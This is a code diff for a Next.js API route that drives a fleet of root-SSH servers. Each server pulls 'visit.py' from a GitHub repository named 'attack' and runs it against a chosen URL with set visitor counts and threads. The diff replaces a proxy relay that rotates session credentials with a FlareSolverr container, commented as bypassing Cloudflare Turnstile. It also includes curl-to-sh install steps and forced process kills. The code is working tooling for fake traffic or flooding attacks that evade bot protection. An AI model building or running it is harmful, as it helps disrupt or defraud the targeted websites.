@@ -14,88 +14,8 @@ const DEFAULT_SERVERS = [
   { host: '206.189.21.125', username: 'root' }
 ];
 
-const SETUP_COMMAND = 'export DEBIAN_FRONTEND=noninteractive && apt-get update -y && apt-get install -y python3 python3-pip wget gnupg2 unzip libnss3 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 fonts-liberation xdg-utils && (apt-get install -y libasound2 2>/dev/null || apt-get install -y libasound2t64 2>/dev/null || true) && wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt-get install -y ./google-chrome-stable_current_amd64.deb 2>/dev/null; rm -f google-chrome-stable_current_amd64.deb && pip3 install undetected-chromedriver requests "selenium>=4.40" "typing_extensions>=4.12" --break-system-packages 2>/dev/null || pip3 install undetected-chromedriver requests "selenium>=4.40" "typing_extensions>=4.12" && echo SETUP_COMPLETE';
-
-function buildRelayScript(proxyHost, proxyPort, proxyUser, proxyPass) {
-  const lines = [
-    '#!/usr/bin/env python3',
-    'import asyncio, base64, random, string',
-    'PROXY_HOST = "' + proxyHost + '"',
-    'PROXY_PORT = ' + proxyPort,
-    'PROXY_USER = "' + proxyUser + '"',
-    'PROXY_PASS = "' + proxyPass + '"',
-    'LISTEN_PORT = 18080',
-    'LISTEN_HOST = "0.0.0.0"',
-    'BUFFER_SIZE = 65536',
-    'def get_session_auth():',
-    '    sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))',
-    '    pw = f"{PROXY_PASS}_session-{sid}"',
-    '    return base64.b64encode(f"{PROXY_USER}:{pw}".encode()).decode()',
-    'async def pipe(r, w):',
-    '    try:',
-    '        while True:',
-    '            data = await asyncio.wait_for(r.read(BUFFER_SIZE), timeout=60)',
-    '            if not data: break',
-    '            w.write(data)',
-    '            await w.drain()',
-    '    except: pass',
-    'async def handle_client(cr, cw):',
-    '    pw = None',
-    '    try:',
-    '        req = b""',
-    '        while b"\\r\\n\\r\\n" not in req:',
-    '            chunk = await asyncio.wait_for(cr.read(BUFFER_SIZE), timeout=15)',
-    '            if not chunk: cw.close(); return',
-    '            req += chunk',
-    '        first = req.split(b"\\r\\n")[0].decode()',
-    '        method = first.split()[0]',
-    '        auth = get_session_auth()',
-    '        pr, pw = await asyncio.wait_for(asyncio.open_connection(PROXY_HOST, PROXY_PORT), timeout=10)',
-    '        if method == "CONNECT":',
-    '            target = first.split()[1]',
-    '            pw.write(f"CONNECT {target} HTTP/1.1\\r\\nHost: {target}\\r\\nProxy-Authorization: Basic {auth}\\r\\nProxy-Connection: keep-alive\\r\\n\\r\\n".encode())',
-    '            await pw.drain()',
-    '            resp = b""',
-    '            while b"\\r\\n\\r\\n" not in resp:',
-    '                chunk = await asyncio.wait_for(pr.read(BUFFER_SIZE), timeout=10)',
-    '                if not chunk: break',
-    '                resp += chunk',
-    '            if b"200" in resp.split(b"\\r\\n")[0]:',
-    '                cw.write(b"HTTP/1.1 200 Connection Established\\r\\n\\r\\n")',
-    '                await cw.drain()',
-    '                await asyncio.gather(pipe(cr, pw), pipe(pr, cw))',
-    '            else:',
-    '                cw.write(resp)',
-    '                await cw.drain()',
-    '        else:',
-    '            lines2 = req.split(b"\\r\\n")',
-    '            new_lines = [lines2[0]]',
-    '            for line in lines2[1:]:',
-    '                if line.lower().startswith(b"proxy-authorization"): continue',
-    '                new_lines.append(line)',
-    '            new_lines.insert(1, f"Proxy-Authorization: Basic {auth}".encode())',
-    '            pw.write(b"\\r\\n".join(new_lines))',
-    '            await pw.drain()',
-    '            while True:',
-    '                data = await asyncio.wait_for(pr.read(BUFFER_SIZE), timeout=30)',
-    '                if not data: break',
-    '                cw.write(data)',
-    '                await cw.drain()',
-    '    except: pass',
-    '    finally:',
-    '        try: cw.close()',
-    '        except: pass',
-    '        try:',
-    '            if pw: pw.close()',
-    '        except: pass',
-    'async def main():',
-    '    server = await asyncio.start_server(handle_client, LISTEN_HOST, LISTEN_PORT, limit=BUFFER_SIZE, backlog=1024)',
-    '    print(f"Relay on {LISTEN_HOST}:{LISTEN_PORT}", flush=True)',
-    '    async with server: await server.serve_forever()',
-    'if __name__ == "__main__": asyncio.run(main())',
-  ];
-  return lines.join('\n');
-}
+// New setup: Docker + FlareSolverr (bypasses CF Turnstile)
+const SETUP_COMMAND = 'export DEBIAN_FRONTEND=noninteractive && (which docker > /dev/null 2>&1 || (curl -fsSL https://get.docker.com | sh)) && docker rm -f flaresolverr 2>/dev/null; docker pull ghcr.io/flaresolverr/flaresolverr:latest && docker run -d --name flaresolverr --restart=always -p 8191:8191 -e LOG_LEVEL=info ghcr.io/flaresolverr/flaresolverr:latest && pip3 install requests --break-system-packages -q 2>/dev/null; pip3 install requests -q 2>/dev/null; sleep 10 && curl -s http://localhost:8191/ | grep -q FlareSolverr && echo SETUP_COMPLETE || echo SETUP_FAILED';
 
 async function runSSHCommand(server, command, timeout = 8000) {
   return new Promise((resolve) => {
@@ -168,7 +88,7 @@ export async function POST(req) {
       return NextResponse.json({ results });
 
     } else if (action === 'deploy') {
-      // Fetch latest visit.py from GitHub (public repo - no token needed)
+      // Fetch latest visit.py from GitHub
       let scriptB64;
       try {
         const ghResp = await fetch('https://raw.githubusercontent.com/fanarali881-eng/attack/main/visit.py', {
@@ -195,34 +115,14 @@ export async function POST(req) {
       const totalVisitors = visitors || 100;
       const serverCount = serverList.length;
       const perServer = Math.ceil(totalVisitors / serverCount);
-      const captchaArg = captchaApiKey || '';
+      const threads = 15; // concurrent threads per server
 
-      // Build the full start command - kill old, deploy relay, start attack - ALL IN ONE SSH command
-      const proxyConfig = (proxies && proxies.length > 0) ? proxies[0] : null;
-      
       const results = await Promise.all(
         serverList.map(async (server) => {
-          let fullCmd = '';
+          // Kill old processes, ensure FlareSolverr running, start visit.py
+          const fullCmd = `killall -9 python3 2>/dev/null; sleep 1; docker start flaresolverr 2>/dev/null; sleep 2; nohup python3 /root/visit.py "${url}" ${perServer} ${threads} > /root/visit.log 2>&1 & echo "Started PID=$! - ${perServer} visits with ${threads} threads"`;
           
-          // Kill old processes
-          fullCmd += 'killall -9 python3 chrome chromedriver 2>/dev/null; fuser -k 18080/tcp 2>/dev/null; rm -f /root/visit_status.json /root/visit.log /root/attack.log; sleep 1; ';
-          
-          // Deploy and start proxy relay
-          if (proxyConfig) {
-            const relayScript = buildRelayScript(proxyConfig.host, proxyConfig.port, proxyConfig.username, proxyConfig.password);
-            const relayB64 = Buffer.from(relayScript).toString('base64');
-            fullCmd += 'fuser -k 18080/tcp 2>/dev/null; echo "' + relayB64 + '" | base64 -d > /root/proxy_relay.py && nohup python3 /root/proxy_relay.py > /root/relay.log 2>&1 & sleep 1; ';
-          }
-          
-          // Start attack
-          if (proxies && proxies.length > 0) {
-            const proxyB64 = Buffer.from(JSON.stringify(proxies)).toString('base64');
-            fullCmd += `echo "${proxyB64}" | base64 -d > /root/proxies.json && nohup python3 /root/visit.py "${url}" ${perServer} /root/proxies.json "${captchaArg}" > /root/visit.log 2>&1 & echo "Started PID=$!"`;
-          } else {
-            fullCmd += `nohup python3 /root/visit.py "${url}" ${perServer} "" "${captchaArg}" > /root/visit.log 2>&1 & echo "Started PID=$!"`;
-          }
-          
-          const r = await runSSHCommand(server, fullCmd, 30000);
+          const r = await runSSHCommand(server, fullCmd, 15000);
           return { host: server.host, ...r };
         })
       );
@@ -231,7 +131,17 @@ export async function POST(req) {
     } else if (action === 'stop') {
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const r = await runSSHCommand(server, 'rm -f /root/visit_status.json /root/attack.log /root/visit.log; kill -9 $(pgrep -f "visit.py") 2>/dev/null; kill -9 $(pgrep -f "proxy_relay.py") 2>/dev/null; killall -9 chrome chromedriver chromium 2>/dev/null; fuser -k 18080/tcp 2>/dev/null; echo "Stopped"', 15000);
+          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; killall -9 python3 2>/dev/null; echo "Stopped"', 15000);
+          return { host: server.host, ...r };
+        })
+      );
+      return NextResponse.json({ results });
+
+    } else if (action === 'status') {
+      // Check status of visits on all servers
+      const results = await Promise.all(
+        serverList.map(async (server) => {
+          const r = await runSSHCommand(server, 'tail -5 /root/visit.log 2>/dev/null || echo "No log"; pgrep -f visit.py > /dev/null && echo "RUNNING" || echo "STOPPED"; curl -s http://localhost:8191/ 2>/dev/null | grep -q FlareSolverr && echo "FLARE_OK" || echo "FLARE_DOWN"', 10000);
           return { host: server.host, ...r };
         })
       );
